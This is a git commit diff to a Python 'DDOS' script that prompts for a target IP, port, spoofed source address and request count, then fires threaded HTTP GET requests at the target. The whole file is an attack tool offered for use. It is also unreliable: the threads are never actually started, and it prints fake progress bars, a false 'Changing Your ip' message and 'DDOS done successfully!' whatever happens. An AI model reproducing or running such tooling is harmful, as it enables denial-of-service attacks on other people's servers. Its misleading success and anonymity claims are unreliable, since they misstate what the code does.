bd956b92636fc401cb51a1ad7fc7396596a05ade
Saad <93708296+Saadkhan041@users.noreply.github.com>
2022-01-05 23:19:03 +0500

    Add files via upload

--- My_DDOSER.py
+++ My_DDOSER.py
@@ -1,40 +1,30 @@
-import os,pyfiglet,random
+import os
+import platform
+s = platform.platform()
+import webbrowser
+
+
+if "Windows" in s:
+    webbrowser.open("my.html")
+
+else:
+    os.system("xdg-open my.html")
+
+
+    os.system("xdg-open my.html")
+try:
+    import pyfiglet
+
+except ModuleNotFoundError:
+    os.system("pip install pyfiglet")
 import threading
-import socket,colorama
-from colorama import Fore
+from scripts.sprint import sprint
+import socket
 import time
-black='\033[30m'
-red='\033[31m'
-green='\033[32m'
-orange='\033[33m'
-blue='\033[34m'
-purple='\033[35m'
-cyan='\033[36m'
-lightgrey='\033[37m'
-darkgrey='\033[90m'
-lightred='\033[91m'
-lightgreen='\033[92m'
-yellow='\033[93m'
-lightblue='\033[94m'
-pink='\033[95m'
-lightcyan='\033[96m'
-all_col = [red,green,orange,cyan,lightgrey,blue,lightred,lightgreen,yellow,lightcyan,lightblue,pink]
-ran = random.choice(all_col)
-os.system("pip install colorama")
-os.system("pip install pyfiglet")
-
-def banner():
-    os.system("clear")
-    en = pyfiglet.figlet_format("Destroyer\nDDOS\n")
-    print(ran, en)
-    print(ran + "\n\t\tV_2.1\t\n\n")
-
-    print(Fore.CYAN, "- " * 4, " [+] Follow me on Instagram @saadkhan041 ", "- " * 4)
-    print(Fore.LIGHTYELLOW_EX, "\n", "- " * 4, " [+] Follow me on Instagram @coding_memz ", "- " * 4)
-    print(Fore.LIGHTRED_EX, "\n", "- " * 4, "[+] Github: https://github.com/Saadkhan041/ ", "- " * 3)
+from scripts.banner import banner2 , banner , clear
+from scripts.colors import ran , c , lc ,ly , lg , lr , r , y
 
 banner()
-
 
 def ddos(port=80):
     try:
@@ -43,81 +33,70 @@ def ddos(port=80):
         stream.sendto((f"GET /{target} HTTP/1.1\r\n").encode("ascii"), (target, port))
         stream.sendto(f"HOST: {fake_ip}\r\n\r\n".encode("ascii"), (target, port))
         stream.close
-    except ValueError:
-        port = 80
-        print(f"{ran4}You skipped the name of port :-(")
 
     except KeyboardInterrupt:
-        print(f"{ran}Have a Good Day :-)")
+        print(f"{lg}Have a Good Day :-)")
 
     except TimeoutError:
-        print("Requests sent successfully\n\nServer timed out!!!!")
+        print(ly + "\nServer timed out!!!!")
 
     except ConnectionRefusedError:
         print(ran, "You've typed wrong ip address")
 
 
 
+no = ["n" , "no"]
+yes = ["y" , "yes"]
 
 cont =" "
-while cont != "n" and "no":
-    print(Fore.LIGHTYELLOW_EX+ "\n\t\t[1] DDOS Attack\n\t\t[2] Exit\n ")
+while cont not in no:
 
-    choice = input(ran + "Enter your choice: ")
-    if choice == "1":
-        target = input(ran + "\nEnter Target ip: ")
-        try:
+    target = input(ran + "\nEnter Target ip: ")
+    try:
 
-            port = int(input(f"{ran}\nEnter port number [default port is 80]: "))
-        except ValueError:
-            port = 80
-            print(f"{ran} \nPort 80 is selected ")
-        else:
-            print(f"{ran}\nport {port} is selected! ")
+        port = int(input(f"{ran}\nEnter port number: "))
+    except ValueError:
+        port = 80
+    else:
+        print(f"{ran}\nport {port} is selected! ")
 
-        fake_ip = input(f"{ran}\nType fake ip to hide your identity: ")
+    fake_ip = input(f"{ran}\nType fake ip to hide your identity: "+lg)
 
-        range_of_req = int(input(f"{ran}\nEnter the range of requests: "))
+    range_of_req = int(input(f"{ran}\nEnter the range of requests: " +lg))
 
-        print(lightred, "\nWait untill all requests are sent" + ("_ " * 10))
-        ddos(port)
-        print(lightblue, "\nChanging Your ip to:", fake_ip)
-        print(cyan, "\nConnecting to port! ")
-        print(pyfiglet.figlet_format("\tAttack\n\tStarting"))
+    sprint(lr + "\nWait until all requests are sent" + ("_" * 10))
+    ddos(port)
+    clear()
 
-        for i in range(range_of_req):
-            thr = threading.Thread(target=ddos)
-            thr.start
+    print(pyfiglet.figlet_format("\tAttack\n\tStarting"))
+    print(c, "\nChanging Your ip to:", fake_ip)
+    print(c, "\nConnecting to port! ")
+    for i in range(range_of_req):
+        thr = threading.Thread(target=ddos)
+        thr.start
 
-        print(ran, "[                    ] 0% ")
-        time.sleep(3)
-        print(ran, "[=====               ] 25%")
-        time.sleep(2)
-        print(ran, "[==========          ] 50%")
-        time.sleep(3)
-        print(ran, "[===============     ] 75%")
-        time.sleep(2)
-        print(cyan, "[====================] 100%")
-        time.sleep(3)
+    sprint(r+ "[                    ] 0% ")
+    time.sleep(1)
+    sprint(r+ "[=====               ] 25%")
+    time.sleep(2)
+    sprint(r+ "[==========          ] 50%")
+    time.sleep(1)
+    sprint(r+ "[===============     ] 75%")
+    time.sleep(2)
+    sprint(r+ "[====================] 100%")
+    time.sleep(1)
 
-        print(f"{ran}\n\n\r[+] DDOS done successfully! \n\n")
+    print(f"{ran}\n\n\r[+]{y} DDOS done successfully! \n\n")
 
-    elif choice == "2":
-        print(ran + "\n\tDont Forget to do following tasks :-)\t\n")
-        print(Fore.CYAN, "- " * 4, " [+] Follow me on Instagram @saadkhan041 ", "- " * 4)
-        print(Fore.LIGHTYELLOW_EX, "\n", "- " * 4, " [+] Follow me on Instagram @coding_memz ", "- " * 4)
-        print(Fore.LIGHTRED_EX, "\n", "- " * 4, "[+] Github: https://github.com/Saadkhan041/ ", "- " * 3)
-        exit()
+    cont = input(ran + "\nDo you want to continue? [y/n]:" + lc).lower()
+
+    if cont in no:
+        clear()
+        banner2()
 
     else:
-        print(ran + "\nInvalid option")
-        exit()
-    cont = input(ran + "\nDo you want to continue? [y/n]:")
-
-    if cont == "y":
-        os.system("clear")
-        banner()
-
+        clear()
+        banner2()
 
 
     
---
+++ scripts/sprint.py
@@ -0,0 +1,14 @@
+import platform
+import sys,time
+from scripts import colors
+c = colors
+def sprint(str):
+	for i in str +c.c + "\n":
+		sys.stdout.write(i)
+		sys.stdout.flush()
+
+		time.sleep(3/90)
+
+
+s = platform.platform()
+print(s)
